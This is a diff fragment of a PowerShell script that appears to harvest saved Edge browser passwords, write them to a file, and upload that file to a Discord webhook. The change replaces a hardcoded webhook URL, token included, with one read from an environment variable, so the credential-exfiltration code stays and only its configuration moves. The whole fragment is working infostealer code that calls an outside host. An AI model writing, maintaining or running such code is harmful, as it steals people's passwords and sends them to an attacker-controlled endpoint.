@@ -266,8 +266,13 @@ $edgeResults | ForEach-Object {
 
 Write-Host "Passwords saved to: $outputFile"
 
-# Discord webhook URL - replace with your real webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1376542728309047346/0o_pYn4n-qcH6nefGVK-acxkoG9kpqM50MW8Gi31t7eT8Uk2wWT5aqftIefhfw67HbWY"
+# Get webhook URL from environment variable
+$webhookUrl = $env:DISCORD_WEBHOOK_URL
+
+if ([string]::IsNullOrEmpty($webhookUrl)) {
+    Write-Error "No webhook URL set. Exiting."
+    exit 1
+}
 
 # Send to Discord webhook using Invoke-RestMethod -Form to upload file properly
 if (Test-Path $outputFile) {
